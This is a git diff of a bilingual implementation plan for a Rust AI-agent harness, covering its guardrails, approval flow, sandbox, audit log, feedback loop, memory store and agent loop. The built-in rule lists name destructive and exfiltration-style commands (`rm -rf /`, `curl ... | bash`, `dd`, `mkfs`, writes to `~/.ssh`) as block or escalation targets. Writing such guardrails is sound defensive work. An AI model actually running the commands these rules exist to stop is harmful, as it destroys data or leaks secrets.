-#[derive(Debug, Clone)]
 pub enum RuleAction { Allow, Deny(String), Escalate }
-
-#[derive(Debug, Clone)]
-pub struct GuardRule {
-    pub id: String,
-    pub name: String,
-    pub pattern: RulePattern,
-    pub action: RuleAction,
-    pub priority: u8,
-}
 ```
 
-- [ ] **Step 2: Implement StaticRuleEngine**
+内置危险规则：`rm -rf /*` → Deny、`rm -rf ~` → Escalate、`DROP TABLE` → Escalate、`DROP DATABASE` → Deny、`curl ... | bash` → Escalate、`git push --force` → Escalate、`chmod 777` → Escalate、`dd if=` → Deny、`mkfs.*` → Deny、写 `/etc/*` → Escalate、写 `~/.ssh/*` → Escalate、写 `.env` → Escalate。规则按优先级排序，首个命中生效。**L1 Deny 始终硬拦截，不受审批力度影响**（实现期约束，commit `dc6052a`）。
 
-```rust
-pub struct StaticRuleEngine {
-    rules: Vec<GuardRule>,
-}
+**测试计划**：`rm -rf /` 拦截、`DROP TABLE` 升级、正常命令放行、`/etc` 写入升级、工作区内写入放行、优先级顺序。
 
-impl StaticRuleEngine {
-    pub fn new() -> Self { Self { rules: Vec::new() } }
-    pub fn add_rule(&mut self, rule: GuardRule) { self.rules.push(rule); }
-    pub fn load_builtin_rules(&mut self) { /* add built-in dangerous rules */ }
-
-    pub fn evaluate(&self, action: &Action, context: &GuardContext) -> RuleResult {
-        // Sort rules by priority (highest first)
-        // For each rule, check if pattern matches
-        // Return the first matching rule's action
-    }
-}
-```
-
-- [ ] **Step 3: Add built-in dangerous rules**
-
-`load_builtin_rules()` adds:
-1. `rm -rf /*` → Deny("Destructive recursive deletion of root")
-2. `rm -rf ~` → Escalate
-3. `DROP TABLE` → Escalate
-4. `DROP DATABASE` → Deny("Database deletion blocked")
-5. `curl ... | bash` → Escalate
-6. `git push --force` → Escalate
-7. `chmod 777` → Escalate
-8. `dd if=` → Deny("Block-level device operations blocked")
-9. `mkfs.*` → Deny("Filesystem creation blocked")
-10. Write to `/etc/*` → Escalate
-11. Write to `~/.ssh/*` → Escalate
-12. Write to `.env` → Escalate
-
-- [ ] **Step 4: Write tests for static rules**
-
-- Test: `test_rm_rf_root_blocked` — construct Action with `rm -rf /`, assert Deny
-- Test: `test_drop_table_escalated` — construct Action with `DROP TABLE users`, assert Escalate
-- Test: `test_normal_command_allowed` — construct Action with `cargo build`, assert not blocked
-- Test: `test_file_write_to_etc_escalated` — construct Action writing to `/etc/config`, assert Escalate
-- Test: `test_file_write_to_src_allowed` — construct Action writing to `src/main.rs`, assert not blocked
-- Test: `test_priority_order` — rules with higher priority match first
-
-- [ ] **Step 5: Run tests**
-
-Run: `cargo test`
-Expected: All static rule tests PASS
-
-- [ ] **Step 6: Commit**
-
-```bash
-git add src/guardrails/ && git commit -m "feat: add static rule engine with built-in dangerous rules
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `368f72f`（feat: add static rule engine with built-in dangerous rules）；规则名称与拦截原因中文化（commit `dc6052a`）
 
 ---
 
-### Task 13: Risk assessors (Layer 2)
+#### 任务 13：风险评估器（第二层）
 
-**Files:**
-- Create: `src/guardrails/assessor.rs`
+**文件**：`src/guardrails/assessor.rs`（新建）
 
-**Produces:** `RiskAssessor` trait, `CommandRiskAssessor`, `FileRiskAssessor`, `NetworkRiskAssessor`, `RiskAssessment`, `RiskLevel`
+**产出**：`RiskAssessor` trait、`CommandRiskAssessor`、`FileRiskAssessor`、`NetworkRiskAssessor`、`RiskAssessment`、`RiskLevel`
 
-- [ ] **Step 1: Implement RiskAssessment and RiskLevel types**
+**关键实现**：
 
 ```rust
-#[derive(Debug, Clone, PartialEq, Eq)]
 pub enum RiskLevel { Low, Medium, High, Critical }
 
-#[derive(Debug, Clone)]
 pub struct RiskAssessment {
     pub level: RiskLevel,
     pub reasons: Vec<String>,
     pub suggested_mitigation: Option<String>,
 }
-
-impl RiskAssessment {
-    pub fn merge(self, other: RiskAssessment) -> RiskAssessment {
-        // Take the higher risk level, combine reasons
-    }
-}
-
-#[async_trait]
-pub trait RiskAssessor: Send + Sync {
-    fn assess(&self, action: &Action, context: &GuardContext) -> RiskAssessment;
-}
 ```
 
-- [ ] **Step 2: Implement CommandRiskAssessor**
+三类评估器：命令评估器（`sudo` → 高、管道/重定向/链式操作符/`curl`/`wget` → 中、多因子叠加 → 高）；文件评估器（工作区外路径 → 高、系统目录 → 严重、隐藏文件 → 低）；网络评估器（外发 HTTP → 中、数据外流模式如 `curl POST`/`scp` → 高）。多评估器结果按"取最高等级 + 合并原因"归并。
 
-Checks bash commands for:
-- `sudo` → High risk
-- `|` (pipe) → Medium risk
-- `>` or `>>` (redirect) → Medium risk
-- `curl` or `wget` → Medium risk
-- `&&` (chain) → Medium risk
-- Combination of multiple risk factors → High
+**测试计划**：`sudo` 高/`echo` 低、工作区外高/内低、`curl` 中、归并取最高。
 
-- [ ] **Step 3: Implement FileRiskAssessor**
-
-Checks file operations for:
-- Path outside workspace root → High
-- Hidden files (`.env`, `.gitignore`) → Low
-- System directories (`/etc`, `/usr`, `/boot`) → Critical
-- Large number of files affected → Medium
-
-- [ ] **Step 4: Implement NetworkRiskAssessor**
-
-Checks for:
-- Any outbound HTTP request → Medium
-- Data exfiltration patterns (curl POST, scp) → High
-- No network activity → Low
-
-- [ ] **Step 5: Write tests**
-
-- Test: `test_command_risk_sudo_is_high`
-- Test: `test_command_risk_echo_is_low`
-- Test: `test_file_risk_outside_workspace_is_high`
-- Test: `test_file_risk_inside_workspace_is_low`
-- Test: `test_network_risk_curl_is_medium`
-- Test: `test_merge_assessments_takes_max` — Low + Medium → Medium, High + Low → High
-
-- [ ] **Step 6: Run tests**
-
-Run: `cargo test`
-Expected: All risk assessor tests PASS
-
-- [ ] **Step 7: Commit**
-
-```bash
-git add src/guardrails/assessor.rs && git commit -m "feat: add risk assessment layer with three assessors
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `52493ab`（feat: add risk assessment layer with three assessors）；评估原因与缓解措施中文化（commit `dc6052a`）
 
 ---
 
-### Task 14: Approval state machine (Layer 3)
+#### 任务 14：审批状态机（原计划第三层，最终管线中为第四层）
 
-**Files:**
-- Create: `src/guardrails/approval.rs`
+**文件**：`src/guardrails/approval.rs`（新建）
 
-**Produces:** `ApprovalGate`, `ApprovalDecision`, `ApprovalRequest`
+**产出**：`ApprovalGate`、`ApprovalDecision`、`ApprovalRequest`
 
-- [ ] **Step 1: Implement ApprovalGate**
+**关键实现**：
 
 ```rust
 pub struct ApprovalGate {
@@ -843,61 +358,33 @@ pub struct ApprovalGate {
     session_whitelist: HashSet<String>,
 }
 
-pub enum ApprovalDecision { Approved { by: String, reason: Option<String> }, Denied { reason: String }, Timeout }
-
-impl ApprovalGate {
-    pub fn new(timeout: Duration) -> Self { ... }
-    pub fn whitelist(&mut self, fingerprint: &str) { ... }
-    pub fn is_whitelisted(&self, fingerprint: &str) -> bool { ... }
-    pub async fn request_approval(&mut self, assessment: &RiskAssessment) -> ApprovalDecision {
-        // 1. Generate fingerprint from action
-        // 2. Check whitelist → if yes, return Approved
-        // 3. Print risk info to stderr
-        // 4. Wait for user input (y/n) with timeout
-        // 5. If approved, add to whitelist
-    }
+pub enum ApprovalDecision {
+    Approved { by: String, reason: Option<String> },
+    Denied { reason: String },
+    Timeout,
 }
 ```
 
-- [ ] **Step 2: Implement action fingerprinting**
+动作指纹（工具名 + 参数哈希）用于会话级白名单——同一会话内已批准的操作自动放行。支持 Approve / Deny / Timeout（默认 120s 超时自动拒绝）。
 
-```rust
-fn fingerprint_action(action: &Action) -> String {
-    // Create a deterministic hash of the action's key properties
-    // For ToolCall: hash of (tool_name + params)
-    // This allows "same action within session" to be auto-approved
-}
-```
+**测试计划**：白名单自动批准、超时判定、不同动作不受白名单影响。
 
-- [ ] **Step 3: Write tests**
-
-- Test: `test_whitelist_auto_approves` — whitelist a fingerprint, request approval, assert Approved
-- Test: `test_timeout_returns_denied` — set 1ms timeout, request approval, assert Timeout
-- Test: `test_different_actions_not_whitelisted` — whitelist one action, verify different action not whitelisted
-
-- [ ] **Step 4: Run tests**
-
-Run: `cargo test`
-Expected: All approval tests PASS
-
-- [ ] **Step 5: Commit**
-
-```bash
-git add src/guardrails/approval.rs && git commit -m "feat: add HITL approval state machine with session whitelist
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 基础实现落地于 commit `8f2e55b`；后续大幅强化（commit `dc6052a` / `efa9f4d` / `04684ff`）：
+- UI 事件模式（`with_ui_events`）：审批请求经 `GuardrailApprovalNeeded` 事件发 UI，决定经通道发回——打通 TUI 与 REPL 的 y/n 审批
+- 可取消轮询读取（`libc::poll` 探测 + 50ms 轮询 + `libc::read`），根治 `spawn_blocking` 阻塞线程泄漏
+- 审批期间 Ctrl+C 视为拒绝（`tokio::select!` 三分支竞争），不再杀死进程
+- 行结束同时接受 `\n` 与 `\r`（raw 环境容错）
+- 审批力度四档（`ApprovalLevel`：无/低/中/高，见 commit `dc6052a`）
 
 ---
 
-### Task 15: Sandbox boundary (Layer 4)
+#### 任务 15：沙箱边界（原计划第四层，最终管线中为第三层）
 
-**Files:**
-- Create: `src/guardrails/sandbox.rs`
+**文件**：`src/guardrails/sandbox.rs`（新建）
 
-**Produces:** `SandboxBoundary`, `SandboxViolation`
+**产出**：`SandboxBoundary`、`SandboxViolation`
 
-- [ ] **Step 1: Implement SandboxBoundary**
+**关键实现**：
 
 ```rust
 pub struct SandboxBoundary {
@@ -907,62 +394,23 @@ pub struct SandboxBoundary {
     pub max_timeout: Duration,
     pub network_allowed: bool,
 }
-
-impl SandboxBoundary {
-    pub fn validate(&self, action: &Action) -> Result<(), SandboxViolation> {
-        // 1. Check file paths are within workspace_root
-        // 2. Check bash commands against allowed/forbidden lists
-        // 3. Check timeout against max_timeout
-        // 4. Check network access if network_allowed is false
-    }
-
-    pub fn wrap_command(&self, cmd: &str) -> String {
-        // Add timeout wrapper: timeout <max_timeout> <cmd>
-    }
-}
 ```
 
-- [ ] **Step 2: Write tests**
+校验内容：文件路径必须在 workspace_root 内、命令黑白名单、超时上限、网络开关；`wrap_command()` 为命令加超时包装。
 
-- Test: `test_path_outside_workspace_rejected` — validate write to `/etc/passwd`, assert Err
-- Test: `test_path_inside_workspace_allowed` — validate write to `src/main.rs`, assert Ok
-- Test: `test_forbidden_command_rejected` — add `rm` to forbidden, validate `rm file`, assert Err
-- Test: `test_network_blocked` — set network_allowed: false, validate curl, assert Err
-- Test: `test_command_wrapping_adds_timeout`
+**测试计划**：工作区外路径拒绝、区内放行、禁用命令拒绝、网络关闭时 curl 拒绝、命令包装。
 
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All sandbox tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/guardrails/sandbox.rs && git commit -m "feat: add sandbox boundary validation
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`。管线顺序修复（commit `8c102ec`）：**沙箱硬校验先于审批**——参数级违规在审批前直接 Blocked，修复"用户批准后仍被沙箱拦截"的假批准。沙箱违规消息中文化（commit `dc6052a`）。
 
 ---
 
-### Task 16: GuardrailPipeline orchestration
+#### 任务 16：GuardrailPipeline 编排
 
-**Files:**
-- Modify: `src/guardrails/mod.rs`
+**文件**：`src/guardrails/mod.rs`（修改）
 
-**Produces:** `GuardrailPipeline`, `GuardContext`
+**产出**：`GuardrailPipeline`、`GuardContext`
 
-- [ ] **Step 1: Implement GuardContext**
-
-```rust
-pub struct GuardContext {
-    pub session_id: String,
-    pub workspace_root: PathBuf,
-    pub user_id: Option<String>,
-}
-```
-
-- [ ] **Step 2: Implement GuardrailPipeline**
+**关键实现**（最终管线顺序，沙箱先于审批；原计划为"先审批后沙箱"，修订见 §7）：
 
 ```rust
 pub struct GuardrailPipeline {
@@ -974,67 +422,35 @@ pub struct GuardrailPipeline {
 }
 
 impl GuardrailPipeline {
-    pub async fn check(&mut self, action: &Action, ctx: &GuardContext) -> Result<GuardResult, HarnessError> {
-        // Layer 1: Static rules
-        let rule_result = self.rules.evaluate(action, ctx);
-        if rule_result.is_deny() { return Ok(GuardResult::Denied { ... }); }
-        if rule_result.is_escalate() { /* continue to assessment */ }
-
-        // Layer 2: Risk assessment
-        let assessment = self.assessors.iter()
-            .fold(RiskAssessment::default(), |acc, a| acc.merge(a.assess(action, ctx)));
-
-        // Layer 3: Approval (if High)
-        if assessment.level == RiskLevel::High {
-            let decision = self.approval.request_approval(&assessment).await;
-            match decision {
-                ApprovalDecision::Approved { .. } => { /* continue */ }
-                _ => { return Ok(GuardResult::Denied { ... }); }
-            }
-        }
-
-        // Layer 4: Sandbox
-        self.sandbox.validate(action)?;
-
-        // Audit
-        self.audit_log.record(action, &assessment, /* decision */);
-
-        Ok(GuardResult::Allowed)
+    pub async fn check(&mut self, action: &Action, ctx: &GuardContext)
+        -> Result<GuardResult, HarnessError> {
+        // 第一层：静态规则——Deny 直接拦截，Escalate 继续评估
+        // 第二层：风险评估——多评估器归并
+        // 第三层：沙箱硬校验——参数级违规直接 Blocked（先于审批）
+        // 第四层：审批（High 风险）——Approve / Deny / Timeout
+        // 审计：每条动作恰好一条记录
     }
 }
 ```
 
-- [ ] **Step 3: Write integration tests**
+**管线不变量**（实现期通过回归测试固化，commit `8c102ec`）：
+1. 沙箱硬校验先于审批——用户永远不会批准一个必然被沙箱拒绝的操作
+2. 每条动作恰好一条审计记录——风险等级使用真实评估值，不硬编码
+3. 拒绝注入反馈回路——`GuardResult::Denied` 不终止 run，拒绝原因作为 Tool 消息注入对话，LLM 调整后重试（`max_turns` 兜底）
 
-In `src/guardrails/mod.rs` `#[cfg(test)]`:
-- Test: `test_pipeline_denies_rm_rf` — pipeline with builtin rules, action `rm -rf /`, assert Denied
-- Test: `test_pipeline_allows_normal_command` — pipeline, action `cargo build`, assert Allowed
-- Test: `test_pipeline_escalates_to_approval` — pipeline with mock approval (auto-deny), action requiring escalation, verify approval state machine is invoked
-- Test: `test_pipeline_sandbox_rejects_outside_path` — pipeline with sandbox, write to `/etc`, assert Denied
+**测试计划**：管线拦截 `rm -rf /`、放行正常命令、升级到审批、沙箱拒绝工作区外路径；回归测试 `test_pipeline_sandbox_blocks_before_approval_single_audit_entry`、`test_pipeline_approval_single_audit_entry`。
 
-- [ ] **Step 4: Run tests**
-
-Run: `cargo test`
-Expected: All pipeline tests PASS
-
-- [ ] **Step 5: Commit**
-
-```bash
-git add src/guardrails/mod.rs && git commit -m "feat: add GuardrailPipeline orchestration
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`，管线不变量修复 commit `8c102ec`
 
 ---
 
-### Task 17: Audit log
+#### 任务 17：审计日志
 
-**Files:**
-- Create: `src/guardrails/audit.rs`
+**文件**：`src/guardrails/audit.rs`（新建）
 
-**Produces:** `AuditLog`, `AuditEntry`
+**产出**：`AuditLog`、`AuditEntry`
 
-- [ ] **Step 1: Implement AuditLog**
+**关键实现**：
 
 ```rust
 pub struct AuditEntry {
@@ -1046,93 +462,39 @@ pub struct AuditEntry {
     pub approver: Option<String>,
     pub reasons: Vec<String>,
 }
-
-pub struct AuditLog {
-    output: std::path::PathBuf,
-    entries: Vec<AuditEntry>,
-}
-
-impl AuditLog {
-    pub fn new(output: std::path::PathBuf) -> Self { ... }
-    pub fn record(&mut self, entry: AuditEntry) {
-        self.entries.push(entry);
-        // Append to JSONL file immediately
-    }
-    pub fn get_entries(&self) -> &[AuditEntry] { &self.entries }
-}
 ```
 
-- [ ] **Step 2: Write tests**
+JSONL 逐条追加写盘（默认 `.AuV/audit.jsonl`，commit `227e1d5` 统一收纳），支持事后回放审计。
 
-- Test: `test_audit_log_writes_to_file` — create temp file, record entry, verify file contains JSON line
-- Test: `test_audit_log_multiple_entries` — record 3 entries, verify all in file
-- Test: `test_audit_log_entries_include_timestamp`
+**测试计划**：写盘验证、多条目、时间戳。
 
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All audit log tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/guardrails/audit.rs && git commit -m "feat: add audit log with JSONL output
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`；单记录不变量修复 commit `8c102ec`
 
 ---
 
-### Task 18: Guardrail configuration file parsing
+#### 任务 18：护栏配置文件解析
 
-**Files:**
-- Create: `src/guardrails/config.rs`
+**文件**：`src/guardrails/config.rs`（新建）
 
-**Produces:** functions to parse guardrail rules from TOML/JSON config
+**产出**：护栏规则 TOML/JSON 解析函数
 
-- [ ] **Step 1: Implement guardrail config parsing**
+**关键实现**：`parse_rules_from_file()` 读取自定义规则（id/name/pattern/action/priority），与内置规则合并，高优先级覆盖。
 
-```rust
-pub fn parse_rules_from_file(path: &Path) -> Result<Vec<GuardRule>, HarnessError> {
-    // Read JSON or TOML file with custom rules
-    // Each rule: { id, name, pattern_type, pattern_value, action, priority }
-    // Merge with built-in rules
-}
-```
+**测试计划**：JSON 自定义规则解析、自定义覆盖内置。
 
-- [ ] **Step 2: Write tests**
-
-- Test: `test_parse_custom_rules_from_json`
-- Test: `test_custom_rules_override_builtin` (higher priority wins)
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/guardrails/config.rs && git commit -m "feat: add guardrail config file parsing
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `4049924`（feat: add guardrail config file parsing）
 
 ---
 
-## Phase 6: Feedback Loop (Tasks 19-20)
+### 阶段 6：反馈闭环（任务 19-20）
 
-### Task 19: Feedback channel trait and FeedbackRunner
+#### 任务 19：反馈通道 trait 与 FeedbackRunner
 
-**Files:**
-- Modify: `src/feedback/mod.rs` (currently placeholder)
-- Create: `src/feedback/test_runner.rs`
-- Create: `src/feedback/type_check.rs`
-- Create: `src/feedback/lint.rs`
+**文件**：`src/feedback/mod.rs`（修改）、`src/feedback/test_runner.rs`、`src/feedback/type_check.rs`、`src/feedback/lint.rs`（新建）
 
-**Produces:** `FeedbackChannel` trait, `FeedbackRunner`, `TestRunnerChannel`, `TypeCheckChannel`, `LintChannel`
+**产出**：`FeedbackChannel` trait、`FeedbackRunner`、`TestRunnerChannel`、`TypeCheckChannel`、`LintChannel`
 
-- [ ] **Step 1: Implement FeedbackChannel trait**
+**关键实现**：
 
 ```rust
 #[async_trait]
@@ -1141,248 +503,69 @@ pub trait FeedbackChannel: Send + Sync {
     fn should_run(&self, action: &Action, context: &FeedbackContext) -> bool;
     async fn run(&self, context: &FeedbackContext) -> Result<FeedbackResult, HarnessError>;
 }
-
-pub struct FeedbackContext {
-    pub workspace_root: PathBuf,
-    pub changed_files: Vec<PathBuf>,
-}
 ```
 
-- [ ] **Step 2: Implement FeedbackRunner**
+三个通道：`test_runner`（`.rs` 变更时跑 `cargo test`，解析失败用例）、`type_check`（`.rs` 变更时跑 `cargo check`）、`lint`（源码变更时跑 `cargo clippy`）。`FeedbackRunner::run_all()` 运行全部适用通道；`should_retry()` 判断是否继续自我修正（默认最多 3 轮）。**反馈闭环不依赖 LLM**——执行命令、解析输出、返回结构化结果，全部可 mock 命令输出测试。
 
-```rust
-pub struct FeedbackRunner {
-    channels: Vec<Box<dyn FeedbackChannel>>,
-    max_retries: usize,
-}
+**测试计划**：test_runner 通过/失败解析、type_check 错误解析、lint 警告解析。
 
-impl FeedbackRunner {
-    pub async fn run_all(&self, action: &Action, ctx: &FeedbackContext) -> Vec<FeedbackResult> {
-        // Run all channels that should_run for this action
-        // Collect and return results
-    }
-    pub fn should_retry(&self, results: &[FeedbackResult], attempt: usize) -> bool {
-        let all_passed = results.iter().all(|r| r.passed);
-        !all_passed && attempt < self.max_retries
-    }
-}
-```
-
-- [ ] **Step 3: Implement TestRunnerChannel**
-
-- `name()` → "test_runner"
-- `should_run()` → true if any `.rs` file changed
-- `run()` → execute `cargo test` in workspace, parse output, extract failures with file:line
-- Test: `test_runner_parses_pass`, `test_runner_parses_failures`
-
-- [ ] **Step 4: Implement TypeCheckChannel**
-
-- `name()` → "type_check"
-- `should_run()` → true if any `.rs` file changed
-- `run()` → execute `cargo check`, parse error output
-- Test: `test_type_check_parses_errors`
-
-- [ ] **Step 5: Implement LintChannel**
-
-- `name()` → "lint"
-- `should_run()` → true if any source file changed
-- `run()` → execute `cargo clippy`, parse warnings
-- Test: `test_lint_parses_warnings`
-
-- [ ] **Step 6: Run tests**
-
-Run: `cargo test`
-Expected: All feedback tests PASS
-
-- [ ] **Step 7: Commit**
-
-```bash
-git add src/feedback/ && git commit -m "feat: add feedback channels and runner
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — 落地于 commit `8f2e55b`
 
 ---
 
-### Task 20: Feedback result formatting for LLM
+#### 任务 20：反馈结果格式化
 
-**Files:**
-- Modify: `src/feedback/mod.rs`
+**文件**：`src/feedback/mod.rs`（修改）
 
-**Produces:** `format_feedback_for_llm()`
+**产出**：`format_feedback_for_llm()`
 
-- [ ] **Step 1: Implement feedback formatting**
+**关键实现**：结构化错误信息（通道名、通过/失败、`文件:行:消息`）格式化为注入 LLM 上下文的文本。
 
-```rust
-pub fn format_feedback_for_llm(results: &[FeedbackResult]) -> String {
-    // Format each result as structured text for injection into LLM context
-    // Include: channel name, pass/fail, specific errors with file:line:message
-    // Example output:
-    // "## Feedback Results:
-    //  **test_runner**: FAILED
-    //    - src/main.rs:42: assertion failed: expected true, got false
-    //  **type_check**: PASSED"
-}
-```
+**测试计划**：全通过、部分失败（含错误细节）、空结果。
 
-- [ ] **Step 2: Write tests**
-
-- Test: `test_format_passing_results` — all pass, verify output
-- Test: `test_format_failing_results` — some fail, verify error details included
-- Test: `test_format_empty_results`
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/feedback/mod.rs && git commit -m "feat: add feedback result formatting for LLM injection
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `e63249e`（feat: add feedback result formatting for LLM injection）
 
 ---
 
-## Phase 7: Memory System (Task 21)
+### 阶段 7：记忆系统（任务 21）
 
-### Task 21: MemoryStore with file-level persistence
+#### 任务 21：文件级持久化 MemoryStore
 
-**Files:**
-- Modify: `src/memory/mod.rs` (currently placeholder)
-- Create: `src/memory/entry.rs`
+**文件**：`src/memory/mod.rs`（修改）、`src/memory/entry.rs`（新建）
 
-**Produces:** `MemoryStore`, `MemoryEntry`, `MemoryMetadata`, `MemoryType`
+**产出**：`MemoryStore`、`MemoryEntry`、`MemoryMetadata`、`MemoryType`
 
-- [ ] **Step 1: Implement MemoryEntry and MemoryMetadata**
+**关键实现**：
 
-In `src/memory/entry.rs`:
 ```rust
-#[derive(Debug, Clone, Serialize, Deserialize)]
 pub enum MemoryType { User, Feedback, Project, Reference }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct MemoryMetadata {
-    pub mem_type: MemoryType,
-    pub tags: Vec<String>,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct MemoryEntry {
-    pub name: String,
-    pub description: String,
+    pub name: String,           // kebab-case 短名
+    pub description: String,    // 一行摘要
     pub file_path: PathBuf,
     pub metadata: MemoryMetadata,
 }
 ```
 
-- [ ] **Step 2: Implement MemoryStore**
+`MemoryStore`：`load_all()` 解析 `MEMORY.md` 索引（`- [name](file.md) — description` 格式）+ 逐文件读 frontmatter；`search()` 按 name + description 关键词匹配；`write()` 写带 frontmatter 的 Markdown 文件并更新索引；`compact_index()` 生成注入 system prompt 的记忆目录文本。存储路径默认 `.AuV/memory/`（commit `227e1d5` 统一收纳）。
 
-In `src/memory/mod.rs`:
-```rust
-pub struct MemoryStore {
-    root: PathBuf,
-    index: Vec<MemoryEntry>,
-}
+**测试计划**：写入后读取、关键词搜索、索引格式、跨实例持久化。
 
-impl MemoryStore {
-    pub fn new(root: PathBuf) -> Self { ... }
-    pub fn load_all(&mut self) -> Result<()> {
-        // Read MEMORY.md index file
-        // Parse each line as: "- [name](file.md) — description"
-        // For each entry, read frontmatter from the .md file
-    }
-    pub fn search(&self, query: &str) -> Vec<&MemoryEntry> {
-        // Simple keyword matching against name + description
-    }
-    pub fn write(&mut self, entry: MemoryEntry, content: &str) -> Result<()> {
-        // Write .md file with frontmatter
-        // Update MEMORY.md index
-        // Add to in-memory index
-    }
-    pub fn compact_index(&self) -> String {
-        // Generate "memory directory" text for LLM system prompt
-        // One line per entry: name + description
-    }
-}
-```
-
-- [ ] **Step 3: Write tests**
-
-- Test: `test_write_and_read_memory` — create temp dir, write memory, load_all, verify entry exists
-- Test: `test_search_finds_relevant_entries` — write 3 entries, search for keyword, verify correct matches
-- Test: `test_compact_index_format` — verify output format
-- Test: `test_memory_persists_across_instances` — write, create new MemoryStore, load, verify
-
-- [ ] **Step 4: Run tests**
-
-Run: `cargo test`
-Expected: All memory tests PASS
-
-- [ ] **Step 5: Commit**
-
-```bash
-git add src/memory/ && git commit -m "feat: add file-level memory system with index
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `3d45dee`（feat: add file-level memory system with index）。**已知缺口**：读侧（索引注入 + 每轮加载）已启用，写侧 `MemoryStore::write()` 无调用点——agent 目前无法保存新记忆，为后续可选任务（见 SPEC.md §11 风险 7）。
 
 ---
 
-## Phase 8: Agent Main Loop (Task 22)
+### 阶段 8：Agent 主循环（任务 22）
 
-### Task 22: AgentLoop with action parser and context builder
+#### 任务 22：AgentLoop + ActionParser + ContextBuilder
 
-**Files:**
-- Modify: `src/loop/mod.rs` (create if placeholder)
-- Create: `src/loop/parser.rs`
-- Create: `src/loop/context.rs`
+**文件**：`src/loop/mod.rs`（修改）、`src/loop/parser.rs`、`src/loop/context.rs`（新建）
 
-**Produces:** `AgentLoop`, `ActionParser`, `ContextBuilder`
+**产出**：`AgentLoop`、`ActionParser`、`ContextBuilder`
 
-- [ ] **Step 1: Implement ActionParser**
+**关键实现**：
 
-In `src/loop/parser.rs`:
-```rust
-pub struct ActionParser;
-
-impl ActionParser {
-    pub fn parse(response: &LlmResponse) -> Result<Action, HarnessError> {
-        // 1. If response has tool_calls, parse first one as Action::ToolCall
-        // 2. If response content contains <tool_call> XML tags, parse
-        // 3. If response content starts with "FINAL ANSWER:", parse as FinalAnswer
-        // 4. Default: return content as FinalAnswer
-    }
-}
-```
-
-- [ ] **Step 2: Implement ContextBuilder**
-
-In `src/loop/context.rs`:
-```rust
-pub struct ContextBuilder {
-    system_prompt: String,
-    tool_menu: String,
-    memory_index: String,
-    config: HarnessConfig,
-}
-
-impl ContextBuilder {
-    pub fn build(&self, messages: &[Message], user_task: &str) -> Vec<Message> {
-        // Build the full context for LLM call:
-        // [System]: system_prompt + tool_menu + rules + memory_index
-        // [User]: user_task
-        // [Assistant]: previous assistant messages
-        // [Tool]: tool results
-    }
-}
-```
-
-- [ ] **Step 3: Implement AgentLoop**
-
-In `src/loop/mod.rs`:
 ```rust
 pub struct AgentLoop {
     llm: Box<dyn LlmProvider>,
@@ -1391,189 +574,66 @@ pub struct AgentLoop {
     feedback: FeedbackRunner,
     memory: MemoryStore,
     config: HarnessConfig,
-    trace_log: TraceLog,
     parser: ActionParser,
     context_builder: ContextBuilder,
-}
-
-impl AgentLoop {
-    pub async fn run(&mut self, task: &str) -> Result<String, HarnessError> {
-        // 1. Load config + memory
-        // 2. Build initial context
-        // 3. Loop:
-        //    a. llm.complete(messages)
-        //    b. parser.parse(response)
-        //    c. guardrails.check(action)
-        //    d. tools.execute(action)
-        //    e. feedback.run_all(action)
-        //    f. inject results into messages
-        //    g. stop_judgment: FinalAnswer? max_turns? token_budget?
-        // 4. Return final response
-    }
-
-    fn stop_judgment(&self, action: &Action, turn: usize, tokens_used: u32) -> bool {
-        matches!(action, Action::FinalAnswer { .. }) ||
-        turn >= self.config.agent.max_turns ||
-        self.config.agent.token_budget.map_or(false, |b| tokens_used >= b)
-    }
+    event_tx: Option<mpsc::Sender<AgentEvent>>,   // 实现期新增：UI 事件通道
 }
 ```
 
-- [ ] **Step 4: Write integration tests with MockLlmProvider**
+- `ActionParser::parse()`：优先解析 tool_calls，其次 `<tool_call>` XML 标签，`FINAL ANSWER:` 前缀识别为 FinalAnswer，默认按文本回答处理
+- `ContextBuilder::build()`：`[System, ...history, User(task)]` 时间顺序排列（system prompt + 工具菜单 + 规则 + 记忆索引在前，历史消息按时间，当前任务最后）
+- `run_with_history()`：加载记忆 → 构建上下文 → 循环（LLM 调用 → 解析 → 护栏 → 分发 → 反馈 → 注入结果 → 停机判断）
+- 停机判断：FinalAnswer / `max_turns`（默认 50）/ token 预算耗尽
 
-- Test: `test_agent_loop_simple_task` — mock LLM returns FinalAnswer, agent completes in 1 turn
-- Test: `test_agent_loop_tool_call` — mock LLM returns ToolCall then FinalAnswer, verify tool executed
-- Test: `test_agent_loop_guardrail_intercept` — mock LLM returns dangerous ToolCall, verify guardrail blocks
-- Test: `test_agent_loop_max_turns` — mock LLM always returns ToolCall, verify stops at max_turns
-- Test: `test_agent_loop_feedback_loop` — mock LLM: ToolCall(change code) → ToolCall → FinalAnswer, verify feedback runner invoked
